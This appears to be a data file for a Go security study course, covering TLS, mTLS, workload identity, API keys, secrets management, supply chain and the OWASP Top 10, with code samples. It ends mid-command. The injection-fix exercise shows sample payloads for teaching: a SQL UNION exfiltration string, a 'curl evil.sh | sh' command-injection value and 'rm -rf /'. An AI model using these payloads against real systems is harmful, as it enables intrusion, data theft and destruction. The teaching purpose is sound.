      interviewFocus: [
        {
          q: 'How does the TLS 1.3 handshake work?',
          a: `<ol>
<li><strong>ClientHello</strong>: supported versions, cipher suites, a <code>key_share</code> with an ephemeral public key (X25519, or hybrid X25519MLKEM768), signature algorithms, SNI, ALPN, optional PSK for resumption.</li>
<li><strong>ServerHello</strong>: chosen suite and the server's <code>key_share</code>. Both sides compute the ECDHE shared secret and run the HKDF key schedule to get handshake keys — everything after this is encrypted.</li>
<li>Server sends <strong>EncryptedExtensions</strong>, optional <strong>CertificateRequest</strong> (mTLS), <strong>Certificate</strong> chain, <strong>CertificateVerify</strong> (signature over the transcript hash with the certificate's private key) and <strong>Finished</strong> (HMAC over the transcript).</li>
<li>Client verifies the chain to a trusted root, hostname vs SAN, validity, the CertificateVerify signature (proves the server owns the key <em>and</em> binds the key exchange to it, preventing MITM) and Finished; optionally sends its own certificate; sends Finished.</li>
<li>Application data flows with traffic keys — <strong>1-RTT</strong> total. NewSessionTicket enables PSK resumption; <strong>0-RTT</strong> early data is possible but replayable.</li>
</ol>
<p>Versus TLS 1.2: 2-RTT, certificate in cleartext, RSA key transport allowed (no forward secrecy), many legacy ciphers; TLS 1.3 removed all non-AEAD ciphers, static RSA/DH, renegotiation and compression.</p>`
        },
        {
          q: 'What happens when a client validates a server certificate?',
          a: `<ol>
<li><strong>Chain building</strong>: from the leaf, using intermediates the server sent (and possibly cached/AIA-fetched ones), up to a root in the client's trust store.</li>
<li><strong>Signature check</strong> of each certificate by its issuer's public key.</li>
<li><strong>Validity</strong>: current time within notBefore/notAfter for every certificate.</li>
<li><strong>Constraints</strong>: intermediates have <code>CA:TRUE</code> and satisfy pathlen; key usage/EKU (<code>serverAuth</code>); name constraints.</li>
<li><strong>Hostname</strong>: requested name matches a DNS/IP SAN (wildcards only one label deep). CN is ignored.</li>
<li><strong>Revocation</strong> (if the client checks): CRL/OCSP/stapled response or browser-pushed lists.</li>
<li><strong>Policy</strong>: browsers also require Certificate Transparency SCTs for public certs.</li>
</ol>
<p>Then during the handshake <strong>CertificateVerify</strong> proves the server holds the private key. Common real-world failures: missing intermediates, SAN mismatch, expired certs, wrong system clock, missing CA bundle in containers.</p>`
        },
        {
          q: 'How does certificate revocation work, and why is it considered broken?',
          a: `<ul>
<li><strong>CRLs</strong>: periodically published lists; large, cache-latency.</li>
<li><strong>OCSP</strong>: real-time query per certificate; leaks browsing to the CA, adds latency, and browsers <em>soft-fail</em> when the responder is unreachable — an attacker able to MITM can usually also block OCSP.</li>
<li><strong>OCSP stapling</strong> removes the privacy/latency issues; <strong>must-staple</strong> would make it hard-fail but adoption was minimal.</li>
</ul>
<p>Result: revocation provided weak guarantees. The ecosystem response: browser-managed revocation sets (CRLSets, CRLite), CAs like Let's Encrypt dropping OCSP (2025) for CRLs, and above all <strong>short-lived certificates</strong> — CA/B Forum SC-081 reduces maximum public validity to 47 days by 2029, and Let's Encrypt offers 6-day certs. Internally, service meshes and SPIFFE issue hour-scale certificates so expiry replaces revocation.</p>`
        },
        {
          q: 'Where should TLS be terminated in a Kubernetes platform?',
          a: `<p>Typical design:</p>
<ul>
<li><strong>Edge</strong>: terminate public TLS at the cloud load balancer or the ingress/Gateway API controller, with certificates from ACME via cert-manager (or the cloud's certificate manager). This enables WAF, L7 routing, auth and rate limiting.</li>
<li><strong>Inside</strong>: re-encrypt — the service mesh provides <strong>mTLS</strong> between ingress and pods and between services, with short-lived workload certificates and identity-based authorization.</li>
<li><strong>Passthrough</strong> for workloads that must terminate TLS themselves (client-certificate auth by the app, non-HTTP protocols, strict end-to-end compliance) using SNI-based routing.</li>
</ul>
<p>Considerations: where private keys live (minimize copies), propagation of the original client IP and client-certificate identity (only via trusted, verified channels), HSTS at the edge, and monitoring the certificates actually served at every hop.</p>`
        },
        {
          q: 'How do you prevent certificate-expiry outages?',
          a: `<ol>
<li><strong>Automate</strong> issuance and renewal everywhere (ACME/cert-manager, SPIRE, cloud certificate managers) — mandatory as public lifetimes shrink to 47 days.</li>
<li><strong>Inventory</strong> all certificates including CA/intermediate certs, client certificates, partner and vendor endpoints, and certs embedded in configs or HSMs, each with an owner.</li>
<li><strong>Monitor what is served</strong>: external probes checking the earliest expiry across the whole chain; alert at 30/14/7 days and on renewal failures (<code>certmanager_certificate_ready_status</code>).</li>
<li><strong>Hot reload</strong> certificates and trust bundles; confirm the new certificate is actually served.</li>
<li><strong>Plan CA rotations</strong> years ahead with overlapping trust bundles; test old clients (the 2021 DST Root CA X3 expiry broke old devices).</li>
<li><strong>Game days</strong>: deliberately expire a cert in staging and measure detection and recovery.</li>
</ol>`
        }
      ],
      quiz: [
        { q: 'How many round trips does a full TLS 1.3 handshake need?', a: 'One (1-RTT); resumption can use 0-RTT early data at the cost of replay risk.' },
        { q: 'Which TLS 1.3 message proves the server holds the certificate\'s private key?', a: 'CertificateVerify, a signature over the handshake transcript hash.' },
        { q: 'Name the three commonly used TLS 1.3 cipher suites.', a: 'TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384 and TLS_CHACHA20_POLY1305_SHA256.' },
        { q: 'Which certificate field is used for hostname verification today?', a: 'The Subject Alternative Name (SAN) extension; the Common Name is ignored by browsers and Go.' },
        { q: 'Which certificates should a server send in the handshake?', a: 'The leaf and all intermediate certificates, but not the root (clients already have trusted roots).' },
        { q: 'Which ACME challenge type is required for wildcard certificates?', a: 'DNS-01.' },
        { q: 'What does HSTS protect against?', a: 'Protocol downgrade / SSL stripping and users clicking through certificate errors, by forcing HTTPS for the domain.' },
        { q: 'What is the difference between TLS termination and passthrough at a load balancer?', a: 'Termination decrypts at the load balancer (enabling L7 features); passthrough forwards encrypted traffic so the backend terminates TLS (end-to-end, SNI routing only).' },
        { q: 'Why can a server that omits its intermediate certificate work for a Go client on macOS or Windows but fail in a Linux container?', a: 'With system roots, Go on macOS and Windows delegates verification to the OS verifier, which can fetch the missing intermediate via the AIA URL or use a cached copy; on Linux Go uses its own verifier, which only uses the certificates sent in the handshake, so it fails with "certificate signed by unknown authority".' }
      ],
      resources: [
        { title: 'RFC 8446 — The Transport Layer Security (TLS) Protocol Version 1.3', url: 'https://datatracker.ietf.org/doc/html/rfc8446', type: 'docs' },
        { title: 'OWASP Transport Layer Security Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html', type: 'docs' },
        { title: 'Let\'s Encrypt — Documentation', url: 'https://letsencrypt.org/docs/', type: 'docs' },
        { title: 'RFC 8555 — Automatic Certificate Management Environment (ACME)', url: 'https://datatracker.ietf.org/doc/html/rfc8555', type: 'docs' },
        { title: 'Go crypto/x509 — Certificate.Verify (platform verifier notes)', url: 'https://pkg.go.dev/crypto/x509#Certificate.Verify', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 11 ────────────────────────────────────────────
    {
      n: 11,
      title: 'mTLS & Zero-Trust Service Security',
      summary: `Securing services that talk to services: the mutual TLS flow, workload identity with SPIFFE/SPIRE, service meshes and cloud workload identity, API security (keys, rate limiting, OWASP API Top 10), secrets management with Vault and cloud stores, software supply-chain security (SBOM, Sigstore/cosign, SLSA), and the OWASP Top 10 web risks — injection, XSS, SSRF, broken access control — with Go-specific defenses.`,
      topics: [
        {
          title: 'Mutual TLS (mTLS) Flow',
          def: `<p>In normal TLS only the server proves its identity. In <strong>mutual TLS</strong> the client also presents a certificate, so both sides are authenticated cryptographically — the foundation of service-to-service zero trust.</p>
<ol>
<li>ClientHello / ServerHello and key exchange as in TLS 1.3.</li>
<li>Server sends <code>CertificateRequest</code> (acceptable signature algorithms and, optionally, acceptable CA names) along with its own Certificate, CertificateVerify, Finished.</li>
<li>Client validates the server certificate (chain to the internal root, SAN = expected service identity).</li>
<li>Client sends its <code>Certificate</code> chain and <code>CertificateVerify</code> (signature over the transcript with its private key), then Finished.</li>
<li>Server validates the client chain against its <strong>ClientCAs</strong> pool, checks EKU <code>clientAuth</code>, validity, and then <strong>authorizes the identity</strong> in the certificate (URI SAN such as a SPIFFE ID, or DNS SAN) against an allow-list or policy.</li>
<li>Application receives the verified peer identity (Go: <code>r.TLS.PeerCertificates[0]</code>) for per-request authorization and audit.</li>
</ol>
<p><strong>Pitfalls</strong>:</p>
<ul>
<li>Authentication &ne; authorization: accepting <em>any</em> certificate signed by your CA lets every workload call every service. Check the identity.</li>
<li>Trusting a public CA for client auth (anyone can get a cert) or a CA shared with unrelated systems — use a dedicated private CA / trust domain.</li>
<li>TLS-terminating proxies lose the client identity unless forwarded in a trusted, sanitized header (Envoy <code>x-forwarded-client-cert</code>) — strip that header from external requests.</li>
<li>Long-lived client certificates and no revocation &rarr; use short-lived, automatically rotated certificates.</li>
<li>Go: <code>tls.RequireAndVerifyClientCert</code> (not <code>RequireAnyClientCert</code>, which doesn't verify the chain).</li>
</ul>`,
          interview: 'Walk through where the client certificate appears in the handshake (CertificateRequest, client Certificate + CertificateVerify), then stress that verifying the chain is only authentication — the server must authorize the peer identity. Mention short-lived certs and proxy header pitfalls.',
          examples: [
            {
              label: 'mTLS server and client in Go with identity allow-list',
              lang: 'go',
              code: `// server (payments)
pool := x509.NewCertPool()
pool.AppendCertsFromPEM(must(os.ReadFile("/certs/ca.crt")))
allowed := map[string]bool{"spiffe://prod.example.com/ns/orders/sa/orders": true}

srv := &http.Server{
    Addr:    ":8443",
    Handler: mux,
    TLSConfig: &tls.Config{
        MinVersion: tls.VersionTLS13,
        ClientAuth: tls.RequireAndVerifyClientCert, // verify chain against ClientCAs
        ClientCAs:  pool,
        VerifyConnection: func(cs tls.ConnectionState) error { // authorize the identity
            for _, u := range cs.PeerCertificates[0].URIs {
                if allowed[u.String()] {
                    return nil
                }
            }
            return errors.New("peer identity not allowed")
        },
    },
    ReadHeaderTimeout: 5 * time.Second,
}
log.Fatal(srv.ListenAndServeTLS("/certs/payments.crt", "/certs/payments.key"))

// client (orders)
cert := must(tls.LoadX509KeyPair("/certs/orders.crt", "/certs/orders.key"))
client := &http.Client{Timeout: 10 * time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{
    MinVersion:   tls.VersionTLS13,
    RootCAs:      pool,
    Certificates: []tls.Certificate{cert},
}}}
resp, err := client.Post("https://payments.payments.svc:8443/v1/charges", "application/json", body)`
            }
          ]
        },
        {
          title: 'Workload Identity: SPIFFE/SPIRE, Service Mesh and Cloud',
          def: `<p><strong>SPIFFE</strong> (CNCF graduated) standardizes workload identity: a <strong>SPIFFE ID</strong> URI <code>spiffe://trust-domain/path</code> (e.g. <code>spiffe://prod.example.com/ns/orders/sa/orders</code>), carried in an <strong>SVID</strong> — an X.509-SVID (ID in the URI SAN, used for mTLS) or a JWT-SVID (for L7/token use). Workloads fetch SVIDs and trust bundles from the local <strong>Workload API</strong> (Unix socket) — no secrets to bootstrap.</p>
<p><strong>SPIRE</strong> (the reference implementation) issues identities:</p>
<ol>
<li><strong>Node attestation</strong>: the SPIRE agent proves which node it runs on (AWS instance identity document, Kubernetes projected service-account token, TPM...) to the SPIRE server.</li>
<li><strong>Workload attestation</strong>: when a process calls the Workload API, the agent inspects it via the kernel/kubelet (namespace, service account, pod labels, container image digest) and matches registration entries.</li>
<li>Agent returns a short-lived X.509-SVID (e.g. 1 h) and the trust bundle; rotates automatically before expiry.</li>
<li><strong>Federation</strong> exchanges trust bundles between trust domains (clusters, clouds, partners).</li>
</ol>
<p><strong>Service meshes</strong> implement the same idea transparently: <strong>Istio</strong> (istiod CA issues SPIFFE-format certificates to Envoy sidecars or, in ambient mode, to per-node ztunnels; <code>PeerAuthentication</code> STRICT enforces mTLS; <code>AuthorizationPolicy</code> authorizes by principal <code>cluster.local/ns/orders/sa/orders</code>, method and path). <strong>Linkerd</strong> enables mTLS automatically for meshed pods with identities derived from service accounts and 24-hour certificates.</p>
<p><strong>Cloud workload identity</strong> replaces static cloud keys: Kubernetes issues a projected, audience-bound service-account JWT; the cloud's STS trusts the cluster's OIDC issuer and exchanges it for short-lived credentials — AWS <strong>IRSA</strong> / <strong>EKS Pod Identity</strong>, <strong>GKE Workload Identity Federation</strong>, <strong>Azure Workload Identity</strong>. The same federation pattern lets CI pipelines (GitHub Actions OIDC) and SPIFFE JWT-SVIDs assume cloud roles.</p>`,
          interview: 'Define SPIFFE ID and SVID, explain node vs workload attestation in SPIRE, and relate it to mesh identities (Istio principals) and cloud workload identity (projected SA token -> STS). The theme: identity from attestation, short-lived credentials, no static secrets.',
          examples: [
            {
              label: 'Istio: STRICT mTLS + identity-based authorization',
              lang: 'text',
              code: `apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata: { name: default, namespace: istio-system }   # mesh-wide
spec:
  mtls: { mode: STRICT }                                 # reject plaintext
---
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata: { name: payments-allow-orders, namespace: payments }
spec:
  selector: { matchLabels: { app: payments } }
  action: ALLOW                                          # once any ALLOW policy exists, everything else is denied
  rules:
  - from: [ { source: { principals: ["cluster.local/ns/orders/sa/orders"] } } ]
    to:   [ { operation: { methods: ["POST"], paths: ["/v1/charges"] } } ]`
            }
          ]
        },
        {
          title: 'API Security: API Keys, Rate Limiting and the OWASP API Top 10',
          def: `<p><strong>API keys</strong> identify a calling <em>application/project</em>, not a user; they are long-lived bearer secrets. Handle them like passwords:</p>
<ul>
<li>Generate &ge; 128 bits from a CSPRNG with a recognizable prefix (<code>ak_live_</code>) so secret scanners (GitHub push protection) can detect leaks.</li>
<li>Store only a hash (SHA-256 is fine for high-entropy keys); show the full key once; keep a non-secret key id for lookup.</li>
<li>Scope (permissions, environments, IP allow-lists), expiry, rotation with overlap, last-used tracking, instant revocation.</li>
<li>Prefer OAuth client credentials or workload identity for service-to-service; API keys for simple developer access.</li>
</ul>
<p><strong>Rate limiting</strong> protects availability and business flows (API4 and API6): token bucket (bursty, smooth average), leaky bucket, fixed window (simple, boundary spikes), sliding window log/counter, GCRA. Limit per API key, per user, per tenant, per IP, per endpoint cost; enforce at the gateway with a shared store (Redis) and return <code>429 Too Many Requests</code> with <code>Retry-After</code>. Also cap request body size, page size, query complexity (GraphQL depth), and timeouts.</p>
<table>
<thead><tr><th>OWASP API Top 10 (2023)</th><th>Core defense</th></tr></thead>
<tbody>
<tr><td>API1 Broken Object Level Authorization</td><td>per-object checks, tenant-scoped queries</td></tr>
<tr><td>API2 Broken Authentication</td><td>standard OAuth/OIDC, token validation, rate-limited login</td></tr>
<tr><td>API3 Broken Object Property Level Authorization</td><td>explicit input/output DTOs (mass assignment, over-exposure)</td></tr>
<tr><td>API4 Unrestricted Resource Consumption</td><td>rate limits, quotas, size/time limits</td></tr>
<tr><td>API5 Broken Function Level Authorization</td><td>deny-by-default route permissions, admin separation</td></tr>
<tr><td>API6 Unrestricted Access to Sensitive Business Flows</td><td>bot/abuse detection on flows like checkout, signup</td></tr>
<tr><td>API7 Server-Side Request Forgery</td><td>egress allow-lists, block internal IPs</td></tr>
<tr><td>API8 Security Misconfiguration</td><td>hardened defaults, CORS, headers, no verbose errors</td></tr>
<tr><td>API9 Improper Inventory Management</td><td>API catalog, retire old versions, no shadow APIs</td></tr>
<tr><td>API10 Unsafe Consumption of APIs</td><td>validate and bound third-party responses, TLS, timeouts</td></tr>
</tbody>
</table>`,
          interview: 'Know that API keys identify apps (not users) and must be hashed, scoped, prefixed and rotatable. Explain token bucket vs sliding window and where to enforce. Be able to list the OWASP API Top 10 2023 and pick BOLA as the most common.',
          examples: [
            {
              label: 'Rate-limited response',
              lang: 'http',
              code: `GET /v1/search?q=shoes HTTP/1.1
Host: api.example.com
Authorization: Bearer ak_live_7KQ2M4ZP_...

HTTP/1.1 429 Too Many Requests
Retry-After: 12
RateLimit-Policy: 100;w=60
RateLimit: limit=100, remaining=0, reset=12
Content-Type: application/problem+json

{"type":"https://api.example.com/problems/rate-limit","title":"Too Many Requests","status":429}`
            }
          ]
        },
        {
          title: 'Secrets Management: Vault, Cloud Secret Stores and Kubernetes',
          def: `<p>Secrets (DB passwords, API keys, signing keys, certificates) must never live in source code, images or plain config. Goals: <strong>central storage, least-privilege access, audit, short lifetimes, automated rotation</strong>.</p>
<ul>
<li><strong>HashiCorp Vault / OpenBao</strong>: identity-based auth (Kubernetes SA tokens, cloud IAM, JWT/OIDC), policies per path, <strong>dynamic secrets</strong> (per-workload DB credentials created on demand with a lease/TTL and revoked automatically), KV v2 with versioning, <strong>Transit</strong> (encryption as a service), <strong>PKI</strong> engine for internal certificates.</li>
<li><strong>Cloud stores</strong>: AWS Secrets Manager (managed rotation via Lambda), GCP Secret Manager, Azure Key Vault — accessed via workload identity, audited in cloud logs.</li>
<li><strong>Kubernetes Secrets</strong> are only base64-encoded; enable <strong>encryption at rest with a KMS provider</strong> (KMS v2), restrict RBAC (<code>list secrets</code> exposes values), avoid mounting into pods that don't need them.</li>
<li>Bridges: <strong>External Secrets Operator</strong> (syncs cloud/Vault secrets into K8s Secrets), <strong>Secrets Store CSI Driver</strong> (mounts as files without creating Secrets), Vault Agent injector. For GitOps: SOPS or Sealed Secrets to store encrypted secrets in Git.</li>
</ul>
<p><strong>Delivery to the app</strong>: prefer mounted files (rotatable, not inherited by child processes, not dumped by <code>env</code> in crash reports) over environment variables; reload on change.</p>
<p><strong>Rotation pattern</strong> (zero downtime): create the new secret alongside the old &rarr; consumers accept/use both (dual credentials) &rarr; switch producers to the new one &rarr; revoke the old. Dynamic secrets make rotation continuous.</p>
<p><strong>Leak response</strong>: scanning (gitleaks, push protection), immediate revocation and rotation (not just deleting the commit — history and forks keep it), and audit of usage during exposure.</p>`,
          interview: 'Describe a concrete setup: workload identity -> Vault/cloud secret store -> files mounted in pods, KMS encryption at rest for etcd, RBAC on secrets, dynamic or automatically rotated credentials, and a leak runbook. Point out that base64 is not encryption.',
          examples: [
            {
              label: 'Vault dynamic Postgres credentials for a Kubernetes workload',
              lang: 'bash',
              code: `vault secrets enable database
vault write database/config/orders-db plugin_name=postgresql-database-plugin \\
  connection_url="postgresql://{{username}}:{{password}}@orders-db:5432/orders?sslmode=verify-full" \\
  allowed_roles="orders-rw" username="vault-admin" password="$BOOTSTRAP_PW"
vault write -force database/rotate-root/orders-db        # Vault now knows the only copy of the admin password

vault write database/roles/orders-rw db_name=orders-db default_ttl=1h max_ttl=24h \\
  creation_statements="CREATE ROLE \\"{{name}}\\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO \\"{{name}}\\";"

vault auth enable kubernetes
vault write auth/kubernetes/role/orders bound_service_account_names=orders \\
  bound_service_account_namespaces=orders policies=orders-db ttl=1h

vault read database/creds/orders-rw     # unique user per lease, auto-revoked at expiry`
            }
          ]
        },
        {
          title: 'Software Supply-Chain Security: SBOM, Sigstore/cosign, SLSA',
          def: `<p>Attacks like SolarWinds (compromised build), Codecov (tampered CI script), the xz-utils backdoor (2024, malicious maintainer) and typosquatted packages target <em>how</em> software is built and delivered. Defenses cover source, dependencies, build, artifacts and deployment:</p>
<ul>
<li><strong>Dependencies</strong>: minimal deps, pinned versions; Go's <code>go.sum</code> + checksum database (<code>GOSUMDB</code>) make module downloads tamper-evident; <code>govulncheck</code>; review new dependencies; pin GitHub Actions by commit SHA.</li>
<li><strong>SBOM</strong> (SPDX or CycloneDX, generated by syft, Trivy or <code>cyclonedx-gomod</code>): inventory of what's inside each artifact, so "are we affected by CVE-X?" is a query, not an investigation. VEX documents state whether a vulnerability is exploitable.</li>
<li><strong>Signing with Sigstore</strong>: <code>cosign</code> keyless signing — the CI job's OIDC identity is exchanged with <strong>Fulcio</strong> for a short-lived certificate, the signature is recorded in the <strong>Rekor</strong> transparency log, and verification checks the expected identity (workflow path) and issuer. No long-lived signing keys to steal.</li>
<li><strong>Provenance and SLSA</strong>: SLSA (Supply-chain Levels for Software Artifacts) v1 build track — L1: provenance exists; L2: generated and signed by a hosted build platform; L3: hardened, isolated builds where provenance cannot be forged by the build steps. Provenance is an in-toto attestation (who built what, from which commit, with which builder).</li>
<li><strong>Deployment gates</strong>: admission policies (Kyverno <code>verifyImages</code>, Sigstore policy-controller) only admit images signed by your CI identity, referenced <strong>by digest</strong>, optionally with SBOM/provenance attestations and vulnerability thresholds.</li>
<li><strong>Build hygiene</strong>: ephemeral runners, least-privilege CI tokens, protected branches with required reviews, reproducible builds (Go builds are largely reproducible with <code>-trimpath</code>).</li>
</ul>
<p>The OWASP Top 10 2025 edition added <strong>Software Supply Chain Failures</strong> as its own category, reflecting how central this has become.</p>`,
          interview: 'Explain keyless cosign (OIDC -> Fulcio cert -> Rekor log -> verify identity+issuer), what an SBOM is for, the SLSA build levels, and how admission control closes the loop. Mention Go-specific controls: go.sum, checksum DB, govulncheck.',
          examples: [
            {
              label: 'Keyless signing, SBOM attestation and verification',
              lang: 'bash',
              code: `IMG=ghcr.io/acme/orders@sha256:3f1c...   # always by digest

# In CI (GitHub Actions with id-token: write)
cosign sign --yes $IMG
syft $IMG -o cyclonedx-json > sbom.cdx.json
cosign attest --yes --type cyclonedx --predicate sbom.cdx.json $IMG

# Anywhere: verify signer identity and issuer
cosign verify $IMG \\
  --certificate-identity-regexp '^https://github.com/acme/orders/.github/workflows/release.yml@refs/tags/v' \\
  --certificate-oidc-issuer https://token.actions.githubusercontent.com

cosign verify-attestation --type cyclonedx $IMG \\
  --certificate-identity-regexp '^https://github.com/acme/orders/' \\
  --certificate-oidc-issuer https://token.actions.githubusercontent.com | jq -r .payload | base64 -d | jq '.predicate.components | length'`
            }
          ]
        },
        {
          title: 'OWASP Top 10 Web Risks: Injection, XSS, SSRF, Broken Access Control',
          def: `<table>
<thead><tr><th>OWASP Top 10:2025</th><th>2021 equivalent</th><th>Go / cloud-native defense</th></tr></thead>
<tbody>
<tr><td>A01 Broken Access Control (now includes SSRF)</td><td>A01 + A10</td><td>deny by default, per-object authz, tenant-scoped queries, CORS allow-list; SSRF: egress allow-lists, IP checks after DNS resolution, IMDSv2</td></tr>
<tr><td>A02 Security Misconfiguration</td><td>A05</td><td>hardened defaults, no debug endpoints, security headers, IaC scanning</td></tr>
<tr><td>A03 Software Supply Chain Failures</td><td>A06 (expanded)</td><td>govulncheck, Renovate, SBOM, signed images, pinned CI actions</td></tr>
<tr><td>A04 Cryptographic Failures</td><td>A02</td><td>TLS everywhere, AEAD, KMS, Argon2id</td></tr>
<tr><td>A05 Injection (incl. XSS)</td><td>A03</td><td>parameterized queries, no shell, <code>html/template</code>, CSP</td></tr>
<tr><td>A06 Insecure Design</td><td>A04</td><td>threat modeling, abuse cases, rate limits on business flows</td></tr>
<tr><td>A07 Authentication Failures</td><td>A07</td><td>MFA/passkeys, session management, rate limiting</td></tr>
<tr><td>A08 Software or Data Integrity Failures</td><td>A08</td><td>signed artifacts, verified updates, no unsafe deserialization</td></tr>
<tr><td>A09 Security Logging and Alerting Failures</td><td>A09</td><td>structured audit logs, alerting on authz failures</td></tr>
<tr><td>A10 Mishandling of Exceptional Conditions</td><td>new</td><td>fail closed on errors and timeouts, no stack traces to clients, bounded retries, panic recovery</td></tr>
</tbody>
</table>
<p>The 2025 edition keeps Broken Access Control at #1 and folds SSRF into it, promotes misconfiguration, broadens vulnerable components into <strong>Software Supply Chain Failures</strong>, and adds <strong>Mishandling of Exceptional Conditions</strong> (fail-open error paths). Many teams and audits still cite 2021 numbering, so know both.</p>
<ul>
<li><strong>SQL injection</strong>: always placeholders (<code>$1</code>/<code>?</code>) with <code>database/sql</code>/pgx; identifiers (ORDER BY columns) from allow-lists; never <code>fmt.Sprintf</code> into SQL. <strong>Command injection</strong>: <code>exec.Command(bin, args...)</code> without a shell; validate arguments, use <code>--</code> separators.</li>
<li><strong>XSS</strong>: Go's <code>html/template</code> escapes contextually (HTML, attributes, JS, URLs); never wrap user input in <code>template.HTML</code>; set a strict <strong>CSP</strong> with nonces (<code>script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'</code>), <code>HttpOnly</code> cookies, and sanitize rich text with an allow-list sanitizer (bluemonday). SPAs: avoid <code>innerHTML</code>/<code>dangerouslySetInnerHTML</code>; Trusted Types.</li>
<li><strong>SSRF</strong>: features that fetch user-supplied URLs (webhooks, previews, imports) can reach internal services and the cloud metadata endpoint (<code>169.254.169.254</code> &rarr; credentials; Capital One 2019). Defenses: allow-list destinations; resolve DNS and block private, loopback, link-local and CGNAT ranges <em>at connect time</em> (prevents DNS rebinding); restrict redirects; no proxy inheritance; isolate the fetcher in a network zone with an egress proxy; enforce <strong>IMDSv2</strong> with hop limit 1; minimal IAM for the fetcher.</li>
<li><strong>Broken access control</strong>: see Module 8 — BOLA/BFLA, plus CORS misconfiguration (reflecting arbitrary <code>Origin</code> with credentials).</li>
</ul>`,
          interview: 'Be ready to name the Top 10 categories and give a Go-specific defense for injection (placeholders, exec without shell), XSS (html/template + CSP) and SSRF (dialer Control blocking internal IPs post-resolution, IMDSv2). Mention the 2025 edition changes to show you are current.',
          examples: [
            {
              label: 'Injection-safe Go: SQL placeholders, allow-listed identifiers, no shell',
              lang: 'go',
              code: `// SQL: values via placeholders, identifiers via allow-list
var sortCols = map[string]string{"created": "created_at", "total": "total_cents"}

func (r *Repo) List(ctx context.Context, tenant, status, sort string, limit int) (*sql.Rows, error) {
    col, ok := sortCols[sort]
    if !ok {
        col = "created_at"
    }
    limit = max(1, min(limit, 100)) // also an API4 resource-consumption control
    q := "SELECT id, total_cents, status FROM orders WHERE tenant_id = $1 AND status = $2 ORDER BY " + col + " DESC LIMIT $3"
    return r.db.QueryContext(ctx, q, tenant, status, limit)
}

// OS commands: no shell, fixed binary, server-generated paths
func thumbnail(ctx context.Context, in, out string) error {
    ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
    defer cancel()
    cmd := exec.CommandContext(ctx, "/usr/bin/vipsthumbnail", in, "-s", "256", "-o", out)
    return cmd.Run() // BAD would be: exec.Command("sh", "-c", "vipsthumbnail "+userFile)
}`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Generate, store and verify API keys safely in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Format <code>ak_live_{id}_{secret}</code>: the id is a lookup key, the secret has &ge; 128 bits.</li><li>Store <code>SHA-256(secret)</code>, scopes, expiry, last_used; show the key once.</li><li>Constant-time comparison; generic 401 on any failure.</li></ul>`,
          solution: `type APIKey struct {
    ID        string
    Hash      []byte
    TenantID  string
    Scopes    []string
    ExpiresAt time.Time
    Revoked   bool
}

func NewAPIKey(tenant string, scopes []string) (plaintext string, rec APIKey) {
    id := strings.ToLower(rand.Text()[:10])
    secret := rand.Text() + rand.Text() // ~260 bits
    sum := sha256.Sum256([]byte(secret))
    return "ak_live_" + id + "_" + secret, APIKey{
        ID: id, Hash: sum[:], TenantID: tenant, Scopes: scopes, ExpiresAt: time.Now().AddDate(1, 0, 0),
    }
}

func (s *KeyStore) Verify(ctx context.Context, presented string) (*APIKey, error) {
    rest, ok := strings.CutPrefix(presented, "ak_live_")
    if !ok {
        return nil, ErrUnauthenticated
    }
    id, secret, ok := strings.Cut(rest, "_")
    if !ok {
        return nil, ErrUnauthenticated
    }
    k, err := s.byID(ctx, id)
    if err != nil {
        return nil, ErrUnauthenticated
    }
    sum := sha256.Sum256([]byte(secret))
    if subtle.ConstantTimeCompare(sum[:], k.Hash) != 1 || k.Revoked || time.Now().After(k.ExpiresAt) {
        return nil, ErrUnauthenticated
    }
    s.touchLastUsed(ctx, id) // async; helps find unused keys to revoke
    return k, nil
}`,
          lang: 'go'
        },
        {
          t: 'Fix SQL injection and command injection in Go handlers',
          d: 'easy',
          type: 'debug',
          hint: `<ul><li>Find string concatenation into SQL and <code>sh -c</code>.</li><li>Values &rarr; placeholders; identifiers &rarr; allow-list; commands &rarr; argv without shell.</li><li>Add a regression test with payloads like <code>' OR '1'='1</code> and <code>; rm -rf /</code>.</li></ul>`,
          solution: `// VULNERABLE
func search(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    rows, _ := db.Query("SELECT id, email FROM users WHERE name = '" + name + "'")
    // name = x' UNION SELECT id, password_hash FROM users -- => data exfiltration
    _ = rows
}
func convert(w http.ResponseWriter, r *http.Request) {
    f := r.URL.Query().Get("file")
    exec.Command("sh", "-c", "convert "+f+" /tmp/out.png").Run()
    // file = a.png; curl evil.sh | sh   => remote code execution
}

// FIXED
func search(w http.ResponseWriter, r *http.Request) {
    rows, err := db.QueryContext(r.Context(), "SELECT id, email FROM users WHERE name = $1", r.URL.Query().Get("name"))
    if err != nil {
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
    // ...
}
func convert(w http.ResponseWriter, r *http.Request) {
    id := r.PathValue("id")                     // reference to a server-side stored upload
    in, err := uploads.PathFor(r.Context(), id) // server-generated path, never user-supplied
    if err != nil {
        http.NotFound(w, r)
        return
    }
    err = exec.CommandContext(r.Context(), "/usr/bin/convert", in, "/tmp/"+id+".png").Run() // no shell
    _ = err
}
// gosec flags G201/G202 (SQL string building) and G204 (subprocess with variable) in CI.`,
          lang: 'go'
        },
        {
          t: 'Set up mTLS between two services with a private CA',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Create a CA; issue a server cert (EKU serverAuth, DNS SAN) and a client cert (EKU clientAuth, URI SAN with a SPIFFE-style ID).</li><li>Server: <code>RequireAndVerifyClientCert</code>, <code>ClientCAs</code>, identity allow-list.</li><li>Test: with client cert &rarr; 200; without &rarr; handshake failure; with a cert from another CA &rarr; failure; allowed CA but wrong identity &rarr; failure.</li></ul>`,
          solution: `# CA
openssl req -x509 -new -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 -days 365 \\
